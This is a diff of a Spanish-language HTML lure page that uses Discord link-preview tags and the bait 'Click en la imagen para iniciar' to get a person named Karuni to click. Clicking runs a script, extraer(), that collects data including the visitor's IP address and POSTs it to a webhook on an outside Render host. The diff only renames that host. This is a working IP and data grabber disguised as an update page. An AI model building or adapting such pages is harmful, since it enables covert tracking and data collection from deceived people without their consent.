@@ -7,8 +7,8 @@
   <!-- Etiquetas Open Graph para Discord -->
   <meta property="og:title" content="Hola Karuni" />
   <meta property="og:description" content="Haz clic en el link para verme el Lobito" />
-  <meta property="og:image" content="https://lobito.onrender.com/Sinulo.png" />
-  <meta property="og:url" content="https://lobito.onrender.com/index.html" />
+  <meta property="og:image" content="https://lobitos.onrender.com/Sinulo.png" />
+  <meta property="og:url" content="https://lobitos.onrender.com/index.html" />
   <meta name="theme-color" content="#ff0000" />
 
   <title>Actualización</title>
@@ -17,8 +17,8 @@
   <h1>Hola Karuni</h1>
   <p>Click en la imagen para iniciar...</p>
   
-  <a href="https://lobito.onrender.com/index.html">
-    <img src="https://lobito.onrender.com/Sinulo.png" alt="Haz clic aquí" style="width:100%; max-width:600px;" onclick="extraer()" />
+  <a href="https://lobitos.onrender.com/index.html">
+    <img src="https://lobitos.onrender.com/Sinulo.png" alt="Haz clic aquí" style="width:100%; max-width:600px;" onclick="extraer()" />
   </a>
 
   <script>
@@ -35,7 +35,7 @@
           data.ip = ipData.ip;
 
           // Enviar a tu backend en Render
-          fetch("https://lobito.onrender.com/webhook", {
+          fetch("https://lobitos.onrender.com/webhook", {
               method: "POST",
               headers: {"Content-Type": "application/json"},
               body: JSON.stringify(data)
